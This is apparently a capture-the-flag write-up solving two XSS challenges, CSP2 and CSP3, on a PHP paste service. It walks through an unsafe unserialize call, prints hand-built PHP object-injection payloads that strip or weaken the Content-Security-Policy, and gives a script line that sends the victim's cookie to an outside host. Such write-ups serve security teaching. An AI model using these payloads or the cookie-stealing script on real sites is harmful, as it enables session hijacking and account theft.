# CSP2 (and CSP3)

## Description
(CSP2) Shame on Shou if he uses CSP incorrectly. More shame on him if he solely uses CSP to prevent XSS.
(CSP3) The code is mostly same as CSP 2 but CSP.module is changed. 

## Overview
As the title suggests, this challenge is a XSS challenge that involves some kind of content security policy. This writeup is about an unintended solution.

The challenge is a paste service that echoes the provided HTML back out as is with a relatively strict CSP:
```
Content-Security-Policy: trusted-types 'none'; object-src 'none'; default-src 'none'; script-src $nonce; script-src-elem $nonce; script-src-attr $nonce; img-src 'self'; style-src $nonce;style-src-elem $nonce;style-src-attr $nonce; base-uri 'self'; report-uri /report_csp;
```

The source code is provided and is written in PHP. The code implements a simple framework along with the paste storage.

## Approach
The first thing I did was look at the CSP itself. The CSP uses a nonce to allow some scripts to run in the paste's page. These script tags are located after the user content, so my intial though was to use dangling markup. However, this turned out to not be possible because neither single or double quotes can capture the nonce.

Not seeing anything wrong with the CSP, I went through the code and quickly noticed that the input in the "user" parameter was directly deserialized (see [this](https://www.php.net/manual/en/function.unserialize.php)). However, there are some (ineffective) checks to make this harder. Immediately after being deserialized, the controlled object is checked to be of a certain type ("UserData"). In addition, all objects have an inherited `__wakeup` method that performs a simple type assertion on the object's properties based on their variable names.

The deserialize:
```php
$user = unserialize($_GET["user"]);
if (get_class($user) != "UserData") \ShouFramework\shutdown();
```

The type checker:
```php
public function __wakeup(){
    $this->type_checker();
}

private function type_checker(){
    $reflection = new ReflectionClass($this);
    $available_vars = $reflection->getProperties();
    foreach ($available_vars as $_ => $value) {
        $exploded_name = explode("_", $value->getName());
        if (count($exploded_name) <= 1) // The type will be ignored if the variable has a single word name.
            continue;
        $type = $exploded_name[count($exploded_name) - 1];
        if (gettype($value->getValue($this)) != $type){ // Note that for any object the type is just "object".
            echo "Program integrity violated\n";
            shutdown();
        }
    }
}
```

However, this type checker has a few limitations:
- The type of the variable is ignored if the name does not contain at least 1 underscore.
- The types of objects is not checked beyond that they are objects.
- We can add new properties with whatever name we want.

The main oversight can be considered that the type check does not realize that deserialized objects can contain additional properties not in their original class. From here I determined that deserialized was likely part of the solution and tried to identify gadgets to deserialize. As it turns out, the HTTP class (used for routes) works by handling its response upon being destructed.

```php
protected function destruct(){
    $this->handle_request();
}
```

(There are some other weird choices in the code like repeatedly hashing the content and user info, but it does not appear to be particularly relevant for the challenge, perhaps a red herring.)

## Creating a payload
My initial idea was to create a payload using the CatGetWithHash route. This route is interesting because it contains a \ShouFramework\CSP object whose properties we can control, one of which is the report url in the CSP. The deserialization payload is relatively simple and I wrote it by hand with some trial and error so I won't go into the process. Just note the top object is of type UserData and contains a new propety called "a" of type CatWithHashGet.

```
O:8:"UserData":2:{s:12:"token_string";s:1:"a";s:1:"a";O:14:"CatWithHashGet":3:{s:11:"user_object";O:8:"UserData":1:{s:12:"token_string";s:1:"a";}s:10:"csp_object";O:18:"\ShouFramework\CSP":1:{s:17:"report_uri_string";s:67:"a; script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'";}s:15:"template_object";O:23:"\ShouFramework\Template":0:{}}};
```

This payload adds script-src-elem to the end of the CSP which works [on latest Chrome](https://portswigger.net/research/bypassing-csp-with-policy-injection). The CSP in CSPv2 does not include script-src-elem, and I thought this was the intended solution because of how similar it is to the PayPal situation. However, the bot is running Firefox anyway so I could not get it to work. I then remembered that in PHP headers cannot be sent after data, so we can just first trigger the CatGet route which does not send the CSP at all! The normal paste route will then be triggered but silently fail set the CSP. As a bonus, the CatGet object is simpler.

```
O:8:"UserData":2:{s:12:"token_string";s:1:"a";s:1:"a";O:6:"CatGet":2:{s:11:"user_object";O:8:"UserData":1:{s:12:"token_string";s:1:"a";}s:15:"template_object";O:23:"\ShouFramework\Template":0:{}}};
```

## Putting it together
Now that the CSP is gone, we can just submit a paste with something like `<scipt>document.location='host/?'+btoa(document.cookie)</script>`, attach our payload in the "user" parameter, and send the URL to the bot. This solution works on both versions of the challenge since the updated one just tightens the CSP a bit.

Flags:

`we{237cb03d-85d3-4312-b0de-5e28e70abafd@r3p0rt_ur1_br3aK_CSP:(}`
`we{d36c47dc-b578-4736-92e0-2368894e6fbb@r3p0rt_ur1_even_13aks_nonce}`

I found out after solving that the intended solution was just setting the report URI to your server to leak the nonce, and the original unintended solution in CSPv2 was using script-src-elem. I also wasn't aware that chaining deserialized objects with properties has a more specific name than arbitrary deserialization: [POP](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection).
